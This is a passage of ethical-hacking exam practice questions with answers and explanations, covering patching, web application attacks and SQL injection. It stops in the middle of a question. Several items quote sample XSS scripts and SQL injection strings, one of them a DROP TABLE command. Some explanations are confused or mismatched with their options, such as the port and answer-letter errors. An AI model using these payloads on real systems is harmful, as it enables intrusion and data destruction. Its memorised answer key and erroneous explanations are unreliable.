492. A network administrator has observed that the computers in his network have Windows 7 operating system. The administrator has learned that the WannaCry ransomeware is affecting Windows 7 Systems across the globe. Which of the following is the best option that the network administrator has to provide efficient security and defend his network?
+ [x] Update Security Patches and fixes provided by Microsoft
+ [ ] Remove all the Windows 7 machines from the network
+ [ ] Conduct vulnerability assessment of all the machines in the network
+ [ ] Perform penetration testing on all the Machines in the network
> **Explanation:**
> Updating the security patches and fixes provided by Microsoft is the recommended way to provide security and defend the network. Removing all Windows 7 machines would prevent a WannaCry attack, but the cost is very high for the company and it is not the ideal way an administrator should provide security. Conducting a penetration test and vulnerability assessment on all the machines is a time-consuming process and there is a chance that the systems will be affected before the test is completed.

493. Which of the following is defined as a package that is used to address a critical defect in a live environment, and contains a fix for a single issue?
+ [ ] Penetration test
+ [x] Hotfix
+ [ ] Patch
+ [ ] Vulnerability
> **Explanation:**
> A hotfix is a package used to address a critical defect in a live environment and contains a fix for a single issue. It updates a specific version of a product. Hotfixes provide solutions faster and ensure that the issues are resolved.

494. Andrew, a software developer in CyberTech organization has released a security update that acts as a defensive technique against the vulnerabilities in the software product the company has released earlier. Identify the technique used by Andrew to resolve the software vulnerabilities?
+ [ ] Product Management
+ [ ] Risk Management
+ [ ] Vulnerability Management
+ [x] Patch Management
> **Explanation:**
> Patch management is a defense against vulnerabilities that cause security weakness or corrupts data. It is a process of scanning for network vulnerabilities, detecting the missed security patches and hotfixes and then deploying the relevant patches as soon as they are available to secure the network.

495. Which of the following terms refers to a set of hotfixes packed together?
+ [x] Service pack
+ [ ] Patch
+ [ ] Repair pack
+ [ ] Hotfix pack
> **Explanation:**
> Hotfixes are an update to fix a specific customer issue and not always distributed outside the customer organization. Vendors occasionally deliver hotfixes as a set of fixes called a combined hotfix or service pack.
> 
> A patch is a small piece of software designed to fix problems, security vulnerabilities, and bugs, and improve the usability or performance of a computer program or its supporting data. A patch can be considered as a repair job done to a programming problem.

# 14. Hacking Web Applications
## Web Application Concepts
496. Which technology do SOAP services use to format information?
+ [ ] ISDN
+ [ ] SATA
+ [x] XML
+ [ ] PCI
> **Explanation:**
> Simple object access protocol (SOAP) is a lightweight and simple XML-based protocol designed to exchange structured and type information on the web. The XML envelope element is always the root element of the SOAP message in the XML schema. A SOAP injection includes special characters such as single quotes, double quotes, semicolons, and so on.

497. Which statement is TRUE regarding network firewalls preventing Web Application attacks?
+ [ ] Network firewalls cannot prevent attacks because they are too complex to configure.
+ [ ] Network firewalls can prevent attacks if they are properly configured.
+ [ ] Network firewalls can prevent attacks because they can detect malicious HTTP traffic.
+ [x] Network firewalls cannot prevent attacks because ports 80 and 443 must be kept opened.
> **Explanation:**
> Port 80 and 443 are linked with "the Internet." Port 443 is the HTTP protocol and Port 80/HTTP is the World Wide Web. By default, these ports are left open to allow outbound traffic on your network and since these ports are kept open, network firewalls cannot prevent attacks.

498. While performing data validation of web content, a security technician is required to restrict malicious input. Which of the following processes is an efficient way of restricting malicious input?
+ [x] Validate web content input for type, length, and range
+ [ ] Validate web content input for query strings
+ [ ] Validate web content input for extraneous queries
+ [ ] Validate web content input with scanning tools
> **Explanation:**
> Data validation is performed to ensure that the data is strongly typed, correct syntax, within length boundaries, contains only permitted characters, or that numbers are correctly signed and within range boundaries. So, while performing data validation of web content, a security technician is required to validate web content input for type, length, and range.

499. A developer for a company is tasked with creating a program that will allow customers to update their billing and shipping information. The billing address field is limited to 50 characters. What pseudo code would the developer use to avoid a buffer overflow attack on the billing address field?
+ [ ] if (billingAddress >= 50) {update field} else exit
+ [ ] if (billingAddress != 50) {update field} else exit
+ [x] if (billingAddress <= 50) {update field} else exit
+ [ ] if (billingAddress = 50) {update field} else exit
> **Explanation:**
> As the billing address field is restricted to 50 characters, one has to use only ‘<=Less than or equal to’ in the pseudo code.

500. Which of the following provides an interface between end users and webservers?
+ [ ] Database
+ [x] Web applications
+ [ ] Demilitarized zone
+ [ ] Firewall
> **Explanation:**
> Web applications provide an interface between end users and webservers through a set of webpages that are generated at the server end or contain script code to be executed dynamically within the client web browser. Web applications and web 2.0 technologies are invariably used to support critical business functions such as CRM, SCM, and so on and to improve business efficiency.

501. If your web application sets any cookie with a secure attribute, what does this mean?
+ [ ] The cookie can not be accessed by JavaScript
+ [ ] The cookie will not be sent cross-domain
+ [ ] Cookies will be sent cross-domain
+ [x] The client will send the cookie only over an HTTPS connection
> **Explanation:**
> A secure cookie can only be transmitted over an encrypted connection (i.e., HTTPS). They cannot be transmitted over unencrypted connections (i.e., HTTP). This makes the cookie less likely to be exposed to cookie theft via eavesdropping. A cookie is made secure by adding the secure flag to the cookie.

502. In which type of fuzz testing do the current data samples create new test data and the new test data again mutates to generate further random data?
+ [ ] Protocol-based
+ [x] Mutation-based
+ [ ] None of the above
+ [ ] Generation-based
> **Explanation:**
> In mutation-based type of fuzz testing, the current data samples create new test data and the new test data again mutates to generate further random data. This type of testing starts with a valid sample and keeps mutating until the target is reached.

503. In which type of fuzz testing does the protocol fuzzer send forged packets to the target application that is to be tested?
+ [x] Protocol-based
+ [ ] Mutation-based
+ [ ] Generation-based
+ [ ] None of the above
> **Explanation:**
> In protocol-based type of testing, the protocol fuzzer sends forged packets to the target application that is to be tested. This type of testing requires detailed knowledge of the protocol format being tested. This type of testing involves writing a list of specifications into the fuzzer tool, then performing a model-based test generation technique to go through all the listed specifications and adding irregularities in the data contents, sequence, and so on.

504. Which of the following is used to detect bugs and irregularities in web applications?
+ [ ] a. Mutation-based fuzz testing
+ [x] d. Source code review
+ [ ] b. Generation-based fuzz testing
+ [ ] c. Protocol-based fuzz testing
> **Explanation:**
> Source code reviews are used to detect bugs and irregularities in the developed web applications. It can be performed manually or by automated tools to identify the specific areas in the application code to handle functions regarding authentication, session management, and data validation. It can identify the unvalidated data vulnerabilities and poor coding techniques of the developers that allow attackers to exploit the web applications.

505. Which of the following is considered as a quality checking and assurance technique used to identify coding errors and security loopholes in web applications?
+ [ ] Sandboxing
+ [ ] Hash Stealing
+ [ ] Session Hijacking
+ [x] Fuzz Testing
> **Explanation:**
> Web application fuzz testing (fuzzing) is a black box testing method. It is a quality checking and assurance technique used to identify coding errors and security loopholes in web applications. Huge amounts of random data called “Fuzz” is generated by the fuzz testing tools (Fuzzers) and used against the target web application to discover vulnerabilities that can be exploited by various attacks.


## Web Application Threats and Attacks
506. What technique is used to perform a Connection Stream Parameter Pollution (CSPP) attack?
+ [ ] Inserting malicious Javascript code into input parameters
+ [ ] Setting a user's session identifier (SID) to an explicit known value
+ [ ] Adding multiple parameters with the same name in HTTP requests
+ [x] Injecting parameters into a connection string using semicolons as a separator
> **Explanation:**
> The attack called Connection String Parameter Pollution (CSPP) specifically exploits the semicolon delimited database connection strings that are constructed dynamically based on the user inputs from web applications. So, injecting parameters into a connection string using semicolons as a separator is performed for a CSPP attack.

507. Which of the following is a common Service Oriented Architecture (SOA) vulnerability?
+ [x] XML denial of service issues
+ [ ] VPath injection
+ [ ] SQL injection
+ [ ] Cross-site scripting
> **Explanation:**
> XML is a versatile data-encoding standard. In XML security issues can be raised as parsing XML complex. One common issue is a denial of service (DOS) against a web service. A user can identify whether a DOS attack has occurred or not by an XML message. If XML provides a very large payload of malicious external entities then DOS can occur.
> 
> Cross-site scripting, SQL injection, and VPath injection have nothing to do with SOA)vulnerability.

508. While testing web applications, you attempt to insert the following test script into the search area on the company’s web site:
`<script>alert(‘Testing Testing Testing’)</script>`
Afterwards, when you press the search button, a pop up box appears on your screen with the text “Testing Testing Testing”. What vulnerability is detected in the web application here?
+ [ ] A buffer overflow
+ [ ] A hybrid attack
+ [x] Cross Site Scripting
+ [ ] Password attacks
> **Explanation:**
> **Buffer Overflow:** Buffer overflow is an abnormality whereby a program while writing data to a buffer, surfeits the intended limit and overwrites the adjacent memory. This results in erratic program behavior, including memory access errors, incorrect results, and crashing a mobile device.
> 
> **Password attacks:** A password attack is the process of trying various password cracking techniques to discover a user account password by which the attacker can gain access to an application.
> 
> **A hybrid attack:** A hybrid attack is more powerful as it uses both a dictionary attack and brute force attack. It also uses symbols and numbers. Password cracking becomes easier with this method.
> 
> **Cross Site Scripting:** Cross Site Scripting or XSS is a type of attack found in web applications, using which an attacker can inject malicious code into the application to get an unauthorized access to the web application. Since the script is inserted in the question, it is Cross Site Scripting or XSS attack.

509. The security analyst for Danels Company arrives this morning to his office and verifies the primary home page of the company. He notes that the page has the logo of the competition and writings that do not correspond to the true page. What kind of attack do the observed signals correspond to?
+ [ ] DDoS
+ [ ] Http Attack
+ [ ] Phishing
+ [x] Defacement
> **Explanation:**
> We see various kinds of attacks, but according to the stem, the correct answer is defacement. In a website defacement attack, attackers completely change the appearance of the website by replacing the original data. They change the website’s look by changing the visuals and displaying different pages with messages of their own. DDoS attack and phishing attack are not valid. An HTTP attack though not valid is somewhat related to the subject.

510. Which of the following attack is not selected as OWASP Top 10 Application Security Risks in the year 2017?
+ [ ] Insecure Deserialization attacks
+ [x] DDoS attacks
+ [ ] Injection attacks
+ [ ] XML External Entity (XXE) attacks
> **Explanation:**
> In the year 2017, injection attacks, insecure deserialization attacks, and XML external entity (XXE) attacks were considered in OWASP top 10 web application risks, whereas DDoS attack was not considered in the list.
> 
> OWASP Top 10 Application Security Risks—2017:
> + A1:2017—Injection
> + A2:2017—Broken Authentication
> + A3:2017—Sensitive Data Exposure
> + A4:2017—XML External Entities (XXE)
> + A5:2017—Broken Access Control
> + A6:2017—Security Misconfiguration
> + A7:2017—Cross-Site Scripting (XSS)
> + A8:2017—Insecure Deserialization
> + A9:2017—Using Components with Known Vulnerabilities
> + A10:2017—Insufficient Logging and Monitoring

511. Which of the following involves injection of malicious code through a web application?
+ [ ] LDAP Injection
+ [x] Command Injection
+ [ ] SQL Injection
+ [ ] Shell Injection
> **Explanation:**
> An SQL Injection involves the injection of malicious SQL queries into user input forms. A LDAP injection involves the injection of malicious LDAP statements, and in a shell injection the attacker tries to craft an input string to gain shell access to a web server. A command injection involves the injection of malicious html code (or) command through a web application. In command injection attacks, a hacker alters the content of the web page by using HTML code and by identifying the form fields that lack valid constraints.

512. Which of the following attacks can take place due to flaws such as insecure cryptographic storage and information leakage?
+ [ ] Command injection
+ [ ] SQL injection
+ [x] Sensitive data exposure
+ [ ] Shell injection
> **Explanation:**
> Many web applications do not protect their sensitive data properly from unauthorized users. Sensitive data exposure takes place due to flaws such as insecure cryptographic storage and information leakage. When an application uses poorly written encryption code to securely encrypt and store sensitive data in the database, the attacker can exploit this flaw and steal or modify weakly protected sensitive data such as credit cards numbers, SSNs, and other authentication credentials.

513. An attacker exploits a web application by tampering with the form and parameter of the web application and he is successful in exploiting the web application and gaining access. Which type of vulnerability did the attacker exploit?
+ [ ] SQL injection
+ [x] Security misconfiguration
+ [ ] Sensitive data exposure
+ [ ] Broken access control
> **Explanation:**
> Using misconfiguration vulnerabilities such as unvalidated inputs, parameter/form tampering, improper error handling, insufficient transport layer protection, and so on, attackers gain unauthorized accesses to default accounts, read unused pages, read/write unprotected files and directories, and so on. Security misconfiguration can occur at any level of an application stack, including the platform, webserver, application server, framework, and custom code.

514. If a threat detection software installed in any organization network either does not record the malicious event or ignores the important details about the event, then what kind of vulnerability is it?
+ [x] Insufficient Logging and Monitoring
+ [ ] Broken Access Control
+ [ ] Sensitive Data Exposure
+ [ ] Security Misconfiguration
> **Explanation:**
> Web applications maintain logs to track usage patterns such as user login credentials and admin login credentials. Insufficient logging and monitoring refers to the scenario where the detection software either does not record the malicious event or ignores the important details about the event. Attackers usually inject, delete, or tamper with web application logs to engage in malicious activities or hide their identities. Any threat detection software with an insufficient logging and monitoring vulnerability makes the detection of malicious attempts of the attacker more difficult to identify and allows the attacker to perform malicious attacks like password brute force etc. to steal confidential passwords.

515. Which of the following attacks exploits vulnerabilities in dynamically generated webpages, which enables malicious attackers to inject client-side scripts into webpages viewed by other users?
+ [ ] Sensitive data exposure
+ [ ] Broken access control
+ [x] Cross-site scripting
+ [ ] Security misconfiguration
> **Explanation:**
> Cross-site scripting (“XSS” or “CSS”) attacks exploit vulnerabilities in dynamically generated webpages, which enables malicious attackers to inject client-side script into webpages viewed by other users. It occurs when invalidated input data is included in dynamic content that is sent to a user’s web browser for rendering. Attackers inject malicious JavaScript, VBScript, ActiveX, HTML, or Flash for execution on a victim’s system by hiding it within legitimate requests. Attackers bypass client-ID security mechanisms and gain access privileges, and then inject malicious scripts into specific webpages. These malicious scripts can even rewrite HTML website content.


## Web Application Hacking Methodology
516. During a penetration test, a tester finds that the web application being analyzed is vulnerable to Cross Site Scripting (XSS). Which of the following conditions must be met to exploit this vulnerability?
+ [ ] The victim's browser must have ActiveX technology enabled.
+ [ ] The victim user should not have an endpoint security solution
+ [ ] The web application does not have the secure flag set.
+ [x] The session cookies do not have the HttpOnly flag set.
> **Explanation:**
> Generally, the XSS attacks target stealing session cookies. If for a web application the HttpOnly flag is not set then it is vulnerable XSS attack. A web server can defend against such attacks by setting the HttpOnly flag on a cookie it creates which is not accessible to the client. When a browser supports HttpOnly and detects a cookie containing the HttpOnly flag, the client side script tries to access the cookie then the browser returns back an empty string. This defends XSS attack by preventing the malicious code sending data to the attacker’s website.

517. A security analyst in an insurance company is assigned to test a new web application that will be used by clients to help them choose and apply for an insurance plan. The analyst discovers that the application has been developed in ASP scripting language and it uses MSSQL as a database backend. The analyst locates the application's search form and introduces the following code in the search input field:  
	```
	IMG SRC=vbscript:msgbox("Vulnerable");> originalAttribute="SRC" originalPath="vbscript:msgbox("Vulnerable");>"  
	```
	When the analyst submits the form, the browser returns a pop-up window that says “Vulnerable.”  
	Which web applications vulnerability did the analyst discover?
+ [ ] Command injection
+ [ ] Cross-site request forgery
+ [ ] SQL injection
+ [x] Cross-site scripting
> **Explanation:**
> In cross-site scripting, attackers bypass client-ID security mechanisms and gain access privileges, and then inject malicious scripts into specific webpages. These malicious scripts can even rewrite HTML website content.
> 
> The cross-site request forgery method is a kind of attack in which an authenticated user is made to perform certain tasks on the web application that an attacker chooses. In command injection, attackers identify an input validation flaw in an application and exploit the vulnerability by injecting a malicious command in the application to execute supplied arbitrary commands on the host operating system. In the SQL injection technique, an attacker injects malicious SQL queries into the user input form either to gain unauthorized access to a database or to retrieve information directly from the database.

518. An attacker has been successfully modifying the purchase price of items purchased on the company’s website. The security administrators verify the webserver and Oracle database have not been compromised directly. They have also verified the intrusion detection system (IDS) logs and found no attacks that could have caused this. What is the most likely way the attacker has been able to modify the purchase price?
+ [x] By changing hidden form values
+ [ ] By using SQL injection
+ [ ] By using cross site scripting
+ [ ] By utilizing a buffer overflow attack
> **Explanation:**
> The situation in the question reflects an authorization attack using hidden fields. When a user selects anything on an HTML page, it stores the selection as form field values and sends it to the application as an HTTP request (GET or POST). HTML can store field values as hidden fields, which the browser does not display to the screen; rather, it collects and submits these fields as parameters during form submissions that the user can manipulate however they choose. The code sent to browsers does not have any security value; therefore, by manipulating the hidden values, the attacker can easily access the pages and run it in the browser.

519. Which of the following is a web application that does not have the secure flag set and that is implemented by OWASP that is full of known vulnerabilities?
+ [ ] WebBugs
+ [x] WebGoat
+ [ ] VULN_HTML
+ [ ] WebScarab
> **Explanation:**
> WebGoat is a web application which is implemented by OWASP that does not have the secure flag set. This web application is kept deliberately insecure with full of known vulnerabilities to teach web application security lessons to all sorts of students.

520. Which of the following conditions must be given to allow a tester to exploit a Cross-Site Request Forgery (CSRF) vulnerable web application?
+ [x] The web application should not use random tokens.
+ [ ] The victim user must open a malicious link with an Internet Explorer prior to version 8.
+ [ ] The session cookies generated by the application do not have the HttpOnly flag set.
+ [ ] The victim user must open a malicious link with Firefox prior to version 3.
> **Explanation:**
> In order to exploit a cross-site request forgery vulnerable web application, the web application should not use random tokens.

521. An attacker identifies the kind of websites a target company/individual is frequently surfing and tests those particular websites to identify any possible vulnerabilities. When the attacker identifies the vulnerabilities in the website, the attacker injects malicious script/code into the web application that can redirect the webpage and download the malware onto the victim’s machine. After infecting the vulnerable web application, the attacker waits for the victim to access the infected web application. What kind of an attack is this?
+ [ ] Denial-of-service attack
+ [x] Water hole attack
+ [ ] Jamming attack
+ [ ] Phishing attack
> **Explanation:**
> In a watering hole attack, the attacker identifies the kind of websites a target company/individual frequently surfs and tests those particular websites to identify any possible vulnerabilities. When the attacker identifies the vulnerabilities in the website, the attacker injects malicious script/code into the web application that can redirect the webpage and download the malware onto the victim machine. After infecting the vulnerable web application, the attacker waits for the victim to access the infected web application. This attack is named as a watering hole attack since the attacker waits for the victim to fall into the trap, which is similar to a situation where a lion waits for its prey to arrive at waterhole to drink water. When the victim surfs through the infected website, the webpage redirects, leading to malware being downloaded onto the victim’s machine, compromising the machine and indeed compromising the network/organization.

522. Which of the following tool is a DNS Interrogation Tool?
+ [ ] SandCat Browser
+ [x] DIG
+ [ ] NetScan Tools Pro
+ [ ] Hping
> **Explanation:**
> **Hping2 / Hping3:** Hping2/Hping3 is a command-line-oriented network scanning and packet crafting tool for the TCP/IP protocol that sends ICMP echo requests and supports TCP, UDP, ICMP, and raw-IP protocols. It performs network security auditing, firewall testing, manual path MTU discovery, advanced traceroute, remote OS fingerprinting, remote uptime guessing, TCP/IP stacks auditing, and other functions.
> 
> **DIG:** DIG is the tool that can be used to perform DNS Interrogation. It can be used as a web-based equivalent of the Unix dig command.
> 
> **NetScan Tools Pro:** NetScanTools Pro is an integrated collection of internet information gathering and network troubleshooting utilities for Network Professionals. Research IPv4 addresses, IPv6 addresses, hostnames, domain names, email addresses and URLs automatically** or with manual tools. It is designed for the Windows operating system.
> 
> **SandCat Browser:** Sandcat is a lightweight multi-tabbed web browser packed with features for developers and pen-testers. The browser is built on top of Chromium, the same engine that powers the Google Chrome browser, and uses the Lua programming language to provide extensions and scripting support.

523. Which of the following automatically discover hidden content and functionality by parsing HTML form and client-side JavaScript requests and responses?
+ [ ] Firewalls
+ [ ] Banners
+ [ ] Proxies
+ [x] Web Spiders
> **Explanation:**
> Web spiders automatically discover hidden content and functionality by parsing HTML form and client-side JavaScript requests and responses. Spiders are typically programmed to visit sites that have been submitted by their owners as new or updated. Entire sites or specific pages can be selectively visited and indexed. Spiders are called spiders because they usually visit many sites in parallel at the same time, with their “legs” spanning a large area of the “web.” Spiders can crawl through a site’s pages in several ways.

524. An attacker wants to exploit a webpage. From which of the following points does he start his attack process?
+ [x] Identify entry points for user input
+ [ ] Identify server-side functionality
+ [ ] Map the attack surface
+ [ ] Identify server-side technologies
> **Explanation:**
> The first step in analyzing a web app is to check for the application entry point, which can later serve as a gateway for attacks. One of the entry points includes the front-end web app that intercepts HTTP requests. Other web app entry points are user interfaces provided by webpages, service interfaces provided by web services, serviced components, and .NET remoting components. Attackers should review the generated HTTP request to identify the user input entry points.

525. An attacker tries to enumerate the username and password of an account named “rini Mathew” on wordpress.com. On the first attempt, the attacker tried to login as “rini.mathews,” which resulted in the login failure message “invalid email or username.” On the second attempt, the attacker tried to login as “rinimathews,” which resulted in a message stating that the password entered for the username was incorrect, thus confirming that the username “rinimathews” exists. What is the attack that is performed by the attacker?
+ [ ] Man-in-the-middle
+ [x] Username enumeration
+ [ ] Phishing
+ [ ] Brute-forcing
> **Explanation:**
> In username enumeration, if the login error states that part of the user name and password is not correct, the attacker guesses the users of the application using the trial-and-error method. Here, an attacker tries to enumerate the username and password of “rini Mathew” on wordpress.com. On the first attempt, the attacker tried to login as “rini.mathews,” which resulted in the login failure message “invalid email or username.” On the second attempt, the attacker tried to login as “rinimathews,” which resulted in a message stating that the password entered for the username was incorrect, thus confirming that the username “rinimathews” exists. Some applications automatically generate account user names based on a sequence (e.g., “user101” and “user102”). Therefore, attackers can perform username enumeration by determining the appropriate sequence.

# 15. SQL Injection
## SQL Injection Concepts
526. A security administrator notices that the log file of the company’s webserver contains suspicious entries:  
	```
	[20/Mar/2011:10:49:07] "GET /login.php?user=test'+oR+3>2%20-- HTTP/1.1" 200 9958  
	[20/Mar/2011:10:51:02] "GET /login.php?user=admin';%20-- HTTP/1.1" 200 9978  
	```
	The administrator decides to further investigate and analyze the source code of the login.php file:  
	```
	php  
	include('../../config/db_connect.php');  
	$user = $_GET['user'];  
	$pass = $_GET['pass'];  
	$sql = "SELECT * FROM USERS WHERE username = '$user' AND password = '$pass'";  
	$result = mysql_query($sql) or die ("couldn't execute query");  
	  
	if (mysql_num_rows($result) != 0) echo 'Authentication granted!';  
	else echo 'Authentication failed!';  
	?>  
	```
	Based on the source code analysis, the analyst concludes that the login.php script is vulnerable to:  
+ [ ] command injection
+ [ ] directory traversal
+ [x] SQL injection
+ [ ] LDAP injection
> **Explanation:**
> An SQL injection query exploits the normal execution of SQL. An attacker submits a request with values that will execute normally but will return data from the database that the attacker wants. The attacker is able to submit these malicious values because of the inability of the application to filter them before processing. If the values submitted by the users are not properly validated, then there is a potential for an SQL injection attack on the application.
> 
> Consider the query ‘ if (mysql_num_rows($result) != 0) echo 'Authentication granted!'; a close examination of this query reveals that the condition in the where clause will always be true. This query successfully executes as there is no syntax error, and it does not violate the normal execution of the query.

527. Which of the following is used to indicate a single-line comment in structured query language (SQL)?
+ [ ] `%%`
+ [x] `--`
+ [ ] `"`
+ [ ] `||`
> **Explanation:**
> Single line comments start with --. Any queries/text written after -- will not be executed.
> 
> For example:
> + `--SELECT * FROM Goods;`
> + `SELECT * FROM Goods;`
> 
> The first query will not be executed as it was written after a single line comment ‘--‘.

528. What is the main difference between a “Normal” SQL injection and a “Blind” SQL injection vulnerability?
+ [x] The vulnerable application does not display errors with information about the injection results to the attacker.
+ [ ] The attack is called “Blind” because, although the application properly filters user input, it is still vulnerable to code injection.
+ [ ] A successful attack does not show an error message to the administrator of the affected application.
+ [ ] The request to the webserver is not visible to the administrator of the vulnerable application.
> **Explanation:**
> In a blind SQL injection, an attacker poses a true or false question to the database to see if the application is vulnerable to SQL injections. A normal SQL injection attack is often possible when a developer uses generic error messages whenever an error occurs in the database. This generic message may reveal sensitive information or give a path to the attacker to carry out an SQL injection attack on the application. However, when developers turn off the generic error message for the application, it is quite difficult for the attacker to perform an SQL injection attack. However, it is not impossible to exploit such an application with an SQL injection attack. Blind injection differs from a normal SQL injection in the way it retrieves data from the database. Blind SQL injection is used either to access sensitive data or to destroy the data. Attackers can steal the data by asking a series of true or false questions through SQL statements. The results of the injection are not visible to the attacker. This process consumes more time as the database generates a new statement for each newly recovered bit.

529. SQL injection attacks do not exploit a specific software vulnerability; instead they target websites that do not follow secure coding practices for accessing and manipulating data stored in a relational database.
+ [x] True
+ [ ] False
> **Explanation:**
> The question tests the student understanding of the root cause of SQLi attacks.
> 
> Web applications use various database technologies as a part of their functionality. Some relational databases used for developing web applications include Microsoft SQL Server, Oracle, IBM DB2, and the open-source MySQL. Developers sometimes unknowingly neglect secure coding practices when using these technologies, which makes the applications vulnerable to SQL injection attacks.

530. Which of the following system table does MS SQL Server database use to store metadata? Hackers can use this system table to acquire database schema information to further compromise the database.
+ [ ] syscells
+ [ ] sysdbs
+ [x] sysobjects
+ [ ] sysrows
> **Explanation:**
> SYSOBJECTS contains a row for every object that has been created in the database, including stored procedures, views, and user tables. Rest of the options does not exist.

531. Which of the following attacks are not performed by an attacker who exploits SQL injection vulnerabilities?
+ [ ] Remote Code Execution
+ [ ] Authentication Bypass
+ [x] Covering Tracks
+ [ ] Information Disclosure
> **Explanation:**
> SQL injection can be used to implement the following attacks: authentication bypass, information disclosure, compromised data integrity, compromised availability of data, and remote code execution. Covering tracks is one of the main stage during system hacking. In this stage, the attacker tries to hide and avoid being detected, or “traced out,” by covering all “tracks,” or logs, generated while gaining access to the target network or computer. Let’s see how the attacker removes traces of an attack in the target computer.

532. Which of the following methods carries the requested data to the webserver as a part of the message body?
+ [ ] Cold Fusion
+ [ ] IBM DB2
+ [x] HTTP POST
+ [ ] HTTP GET
> **Explanation:**
> An HTTP POST request is one of the methods used to carry the requested data to the webserver. Unlike the HTTP GET method, an HTTP POST request carries the requested data as a part of the message body. Thus, it is considered more secure than HTTP GET.

533. Which of the following is the most effective technique in identifying vulnerabilities or flaws in the web page code?
+ [ ] Traffic Analysis
+ [ ] Packet Analysis
+ [x] Code Analysis
+ [ ] Data Analysis
> **Explanation:**
> Code analysis or code review is the most effective technique in identifying vulnerabilities or flaws in the code. Traffic analysis refers to analyzing the network traffic whereas packet analysis refers to analyzing the network packets that have been transferred in a network. Data analysis refers to analyzing the data. This data can be anything, depending on the situation.

534. An attacker injects the following SQL query:
`blah' AND 1=(SELECT COUNT(*) FROM mytable); --` What is the intention of the attacker?
+ [ ] Deleting a Table
+ [ ] Adding New Records
+ [x] Identifying the Table Name
+ [ ] Updating Table
> **Explanation:**
> When an attacker injects the following SQL query:
> `blah' AND 1=(SELECT COUNT(*) FROM mytable); --`
> His intention is to identify the table name.
> For example:
> `SELECT jb-email, jb-passwd, jb-login_id, jb-last_name FROM table WHERE jb-email = 'blah' AND 1=(SELECT COUNT(*) FROM mytable); --';`
> 
> For updating table, he shall use :
> `blah'; UPDATE jb-customers SET jbemail= 'info@certifiedhacker.com' WHERE email='jason@springfield.com; - -`
> 
> For Adding New Records, he shall use :
> `blah'; INSERT INTO jb-customers ('jb-email','jb-passwd','jblogin_id','jb-last_name') VALUES ('jason@springfield.com','hello',' jason','jason springfield');--`
> 
> For Deleting a Table, he shall use :
> `blah'; DROP TABLE Creditcard; --`

535. Bank of Timbuktu is a medium-sized, regional financial institution in Timbuktu. The bank has recently deployed a new Internet-accessible web application. Customers can access their account balances, transfer money between accounts, pay bills, and conduct online financial business using a web browser.  
John Stevens is in charge of information security at the Bank of Timbuktu. After one month in production, several customers have complained about the Internet-enabled banking application. Strangely, the account balances of many of the bank’s customers have been changed! However, money has not been removed from the bank; instead, money is transferred between accounts. Given this attack profile, John Stevens reviewed the web application’s logs and found the following entries:
	```
	Attempted login of unknown user: johnm  
	Attempted login of unknown user: susaR  
	Attempted login of unknown user: sencat  
	Attempted login of unknown user: pete'';  
	Attempted login of unknown user: ' or 1=1--  
	Attempted login of unknown user: '; drop table logins--  
	Login of user jason, sessionID= 0x75627578626F6F6B  
	Login of user daniel, sessionID= 0x98627579539E13BE  
	Login of user rebecca, sessionID= 0x9062757944CCB811  
	Login of user mike, sessionID= 0x9062757935FB5C64  
	Transfer Funds user jason  
	Pay Bill user mike  
	Logout of user mike
	```
	What kind of attack did the hacker attempt to carry out at the bank?
+ [ ] Brute force attack in which the hacker attempted guessing login IDs and passwords from password-cracking tools.
+ [ ] The hacker used a generator module to pass results to the webserver and exploited web application CGI vulnerability.
+ [ ] The hacker attempted session hijacking, in which the hacker opened an account with the bank, then logged in to receive a session ID, guessed the next ID, and took over Jason’s session.
+ [x] The hacker first attempted logins with suspected user names, and then used SQL injection to gain access to valid bank login IDs.
> **Explanation:**
> Programmers use sequential SQL commands with client-supplied parameters, making it easier for attackers to inject commands. SQL injection is a technique used to take advantage of unsanitized input vulnerabilities to pass SQL commands through a web application for execution by a backend database. In this technique, the attacker injects malicious SQL queries into the user input form, either to gain unauthorized access to a database or to retrieve information directly from the database. It is a flaw in web applications and is not an issue with the database or the webserver.
> 
> An HTML form that receives and passes information posted by the user to the active server pages (ASP) script running on an IIS webserver is the best example of SQL injection. The information passed is the username and password. To create an SQL injection query, an attacker may submit the following values in application input fields, such as the username and password field.
> 
> ```
> Username: Blah' or 1=1 --  
> Password: Springfield  
> ```
> 
> As a part of normal execution of query, these input values will replace placeholders, and the query will appear as follows:
> `SELECT Count(*) FROM Users WHERE UserName='Blah' or 1=1 --' AND Password='Springfield';`
> Session hijacking refers to an attack where an attacker takes over a valid TCP communication session between two computers. Since most authentication occurs only at the start of a TCP session, it allows the attacker to gain access to a machine. Attackers can sniff all the traffic from the established TCP sessions and perform identity theft, information theft, fraud, and so on.
> 
> Common gateway interface (CGI) offers a standard protocol for webservers to execute programs that execute like Console applications (also called command-line interface programs) running on a server that generates webpages dynamically.
> 
> A brute force attack is a trial-and-error method used to obtain information such as a user password or personal identification number (PIN). In a brute force attack, automated software is used to generate a large number of consecutive guesses as to the value of the desired data.


## Types of SQL Injection Attacks
536. Steve works as a penetration tester in a firm named InfoSecurity. Recently, Steve was given an assignment to test the security of the company’s web applications and backend database. While conducting the test, he sends a malicious SQL query with conditional timing delays to the backend database through the web application. This conditional time delay forces the database to wait for a specified amount of time before responding. He performs the same task using different malicious SQL queries. By observing various query responses from the database, Steve came to know that the web application is vulnerable to an SQL injection attack.  
What type of SQL injection attack is Steve most likely performing?
+ [x] Blind SQL injection
+ [ ] Out-of-band SQL Injection
+ [ ] Error-based SQL injection
+ [ ] Union-based SQL injection
> **Explanation:**
> + **Blind SQL injection:** In this attack, the attacker simply asks a series of false or true questions by sending a malicious SQL query to the database. It is time consuming because a new statement needs to be crafted for each bit recovered. Based on the response, the attacker determines whether the web application is vulnerable to SQL injection attack or not.
> + **Error-based SQL injection:** In this attack, the attacker obtains information about the database by analyzing the error messages obtained from the underlying database.
> + **Union-based SQL injection:** In this attack, the attacker uses the UNION SQL operator to combine two or more malicious queries into a single statement. This allows the attacker to get a single result containing responses from all the malicious queries.
> + **Out-of-band SQL injection:** In this attack, the attacker uses the enabled feature of the database server to launch an attack. This is an alternative to time-based blind injection attack.

537. Select all correct answers.  
In blind SQLi, attackers can steal data by asking a series of true or false questions through SQL statements. Select all the correct types of blind SQL injections.
+ [ ] System stored procedure
+ [x] Time Delay
+ [ ] Tautology
+ [x] Boolean exploitation
> **Explanation:**
> Unlike an error-based SQL injection, a blind SQL injection is used when a web application is vulnerable to an SQL injection, but the results of the injection are not visible to the attacker. Both (a) and (b) are types of Blind SQLi. However, (c) and (d) are types of error-based SQL injections.

538. In which of the following attacks does an attacker use the same communication channel to perform the attack and retrieve the results?
+ [ ] Out-of-band SQL injection
+ [x] In-band SQL injection
+ [ ] Inferential SQL injection
